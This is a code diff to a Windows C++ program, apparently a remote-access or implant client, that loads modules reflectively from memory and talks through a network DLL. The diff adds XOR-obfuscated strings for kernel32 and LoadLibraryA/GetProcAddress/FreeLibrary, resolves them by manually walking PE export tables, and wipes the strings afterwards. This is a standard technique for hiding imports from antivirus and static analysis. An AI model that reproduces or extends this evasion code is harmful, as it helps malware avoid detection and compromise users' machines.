@@ -22,6 +22,9 @@
 #include <vector>
 #include "MemoryModule.h"
 
+#define HEX_K 0xFF
+#define X_C(c) static_cast<char>((c) ^ HEX_K)
+
 /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
 LPCSTR dllPath_n = "network_lib.dll";
@@ -30,14 +33,13 @@ HINSTANCE hDLL_n;
 
 //------------------------------------------------------------------------------------------------------------------------------
 
-typedef HMODULE(WINAPI *LoadLibraryAFn)(LPCSTR);
-LoadLibraryAFn MyLoadLibraryA;
+typedef HMODULE(WINAPI *Ld_Lib_AFn)(LPCSTR);
+typedef FARPROC(WINAPI *Custom_Get_Proc_Addr)(HMODULE, LPCSTR);
+typedef HMODULE(WINAPI *Free_Lib_Fn)(HMODULE);
 
-typedef FARPROC(WINAPI *CustomGetProcAddress)(HMODULE, LPCSTR);
-CustomGetProcAddress myGetProcAddress;
-
-typedef HMODULE(WINAPI *FreeLibraryFn)(HMODULE);
-FreeLibraryFn MyFreeLibrary;
+Ld_Lib_AFn My_Ld_Lib_A;
+Custom_Get_Proc_Addr My_GetProc_Addr;
+Free_Lib_Fn My_Free_Lib;
 
 typedef int (*SendDataFunc)(const std::string&, const std::string&);
 typedef std::string (*RecvDataFunc)(const std::string&);
@@ -68,12 +70,27 @@ void* FindExportAddress(HMODULE hModule, const char* funcName);
 
 int main(int argc, char* argv[])
 {
+    char obf_Ker_32[] = { X_C('k'), X_C('e'), X_C('r'), X_C('n'), X_C('e'), X_C('l'), X_C('3'), X_C('2'), X_C('.'), X_C('d'), X_C('l'), X_C('l'), '\0'};
+    char obf_Ld_Lib_A[] = { X_C('L'), X_C('o'), X_C('a'), X_C('d'), X_C('L'), X_C('i'), X_C('b'), X_C('r'), X_C('a'), X_C('r'), X_C('y'), X_C('A'), '\0'};
+    char obf_Gt_Pr_A[] = { X_C('G'), X_C('e'), X_C('t'), X_C('P'), X_C('r'), X_C('o'), X_C('c'), X_C('A'), X_C('d'), X_C('d'), X_C('r'), X_C('e'), X_C('s'), X_C('s'), '\0'};
+    char obf_Fr_Lib_A[] = { X_C('F'), X_C('r'), X_C('e'), X_C('e'), X_C('L'), X_C('i'), X_C('b'), X_C('r'), X_C('a'), X_C('r'), X_C('y'), '\0'};
+    
+    for (int i = 0; obf_Ker_32[i] != '\0'; i++) obf_Ker_32[i] ^= HEX_K;
+    for (int i = 0; obf_Ld_Lib_A[i] != '\0'; i++) obf_Ld_Lib_A[i] ^= HEX_K;
+    for (int i = 0; obf_Gt_Pr_A[i] != '\0'; i++) obf_Gt_Pr_A[i] ^= HEX_K;
+    for (int i = 0; obf_Fr_Lib_A[i] != '\0'; i++) obf_Fr_Lib_A[i] ^= HEX_K;
 
-    HMODULE hKernel32 = (HMODULE)GetModuleHandleA("kernel32.dll");
 
-    MyLoadLibraryA = (LoadLibraryAFn)FindExportAddress(hKernel32, "LoadLibraryA");
-    myGetProcAddress = (CustomGetProcAddress)FindExportAddress(hKernel32, "GetProcAddress");
-    MyFreeLibrary = (FreeLibraryFn)FindExportAddress(hKernel32, "FreeLibrary");
+    HMODULE hK_32 = (HMODULE)GetModuleHandleA(obf_Ker_32);
+    My_Ld_Lib_A = (Ld_Lib_AFn)FindExportAddress(hK_32, obf_Ld_Lib_A);                      // get the address of LoadLibraryA
+    My_GetProc_Addr = (Custom_Get_Proc_Addr)FindExportAddress(hK_32, obf_Gt_Pr_A);            // get the address of GetProcAddress
+    My_Free_Lib = (Free_Lib_Fn)FindExportAddress(hK_32, obf_Fr_Lib_A);                         // get the address of FreeLibrary
+
+
+    SecureZeroMemory(obf_Ker_32, sizeof(obf_Ker_32));
+    SecureZeroMemory(obf_Ld_Lib_A, sizeof(obf_Ld_Lib_A));
+    SecureZeroMemory(obf_Gt_Pr_A, sizeof(obf_Gt_Pr_A));
+    SecureZeroMemory(obf_Fr_Lib_A, sizeof(obf_Fr_Lib_A));
 
     std::atomic<bool> receivedTerminationSignal(false);
     
@@ -126,7 +143,7 @@ int main(int argc, char* argv[])
 
     terminationCheckThread.join();
 
-    MyFreeLibrary(hDLL_n);
+    My_Free_Lib(hDLL_n);
     MemoryFreeLibrary(hDLL_k);
     MemoryFreeLibrary(hDLL_m);
     MemoryFreeLibrary(hDLL_w);
@@ -136,23 +153,17 @@ int main(int argc, char* argv[])
 
 void* FindExportAddress(HMODULE hModule, const char* funcName)
 {
-    // Access the PE headers of the loaded module
     IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)hModule;
     IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)hModule + dosHeader->e_lfanew);
 
-    // Get the export directory
     IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hModule + ntHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
 
-    // Get the list of function names and addresses
     DWORD* nameRVAs = (DWORD*)((BYTE*)hModule + exportDir->AddressOfNames);
     WORD* ordRVAs = (WORD*)((BYTE*)hModule + exportDir->AddressOfNameOrdinals);
     DWORD* funcRVAs = (DWORD*)((BYTE*)hModule + exportDir->AddressOfFunctions);
-
-    // Search through the list of function names
     for (DWORD i = 0; i < exportDir->NumberOfNames; ++i)
     {
         char* funcNameFromExport = (char*)((BYTE*)hModule + nameRVAs[i]);
-//std::cout << "Checking " << funcNameFromExport << std::endl;
         if (strcmp(funcNameFromExport, funcName) == 0)
         {
             DWORD funcRVA = funcRVAs[ordRVAs[i]];
@@ -160,23 +171,25 @@ void* FindExportAddress(HMODULE hModule, const char* funcName)
 
         }
     }
+    std::string errorMsg = "Failed to find export address for function: ";
+    errorMsg += funcName;
+    MessageBoxA(NULL, errorMsg.c_str(), "Error", MB_OK);
     return nullptr;
-
 }
 
 int load_dlls()                                             // loads the dlls from the disk
 {
 
-    hDLL_n = MyLoadLibraryA(dllPath_n);
+    hDLL_n = My_Ld_Lib_A(dllPath_n);
     if (hDLL_n == nullptr)
     {
         std::cerr << "Failed to load DLL: " << GetLastError() << std::endl;
         return EXIT_FAILURE;
     }
 
-    receive_data_raw = (RecvDataRawFunc)myGetProcAddress(hDLL_n, "?receive_data_raw@@YA?AV?$vector@EV?$allocator@E@std@@@std@@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z");
-    receive_data = (RecvDataFunc)myGetProcAddress(hDLL_n, "?receive_data@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBV12@@Z");
-    send_data = (SendDataFunc)myGetProcAddress(hDLL_n, "?send_data@@YAHAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z");
+    receive_data_raw = (RecvDataRawFunc)My_GetProc_Addr(hDLL_n, "?receive_data_raw@@YA?AV?$vector@EV?$allocator@E@std@@@std@@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z");
+    receive_data = (RecvDataFunc)My_GetProc_Addr(hDLL_n, "?receive_data@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBV12@@Z");
+    send_data = (SendDataFunc)My_GetProc_Addr(hDLL_n, "?send_data@@YAHAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z");
     if (!receive_data || !send_data || !receive_data_raw)
     {
         std::cerr << "Failed to get one or more function addresses for network dll.\n";
@@ -267,7 +280,7 @@ BOOL CtrlHandler(DWORD fdwCtrlType)
             cleanup_m();
             cleanup_aw();
 
-            MyFreeLibrary(hDLL_n);
+            My_Free_Lib(hDLL_n);
             MemoryFreeLibrary(hDLL_k);
             MemoryFreeLibrary(hDLL_m);
             MemoryFreeLibrary(hDLL_w);
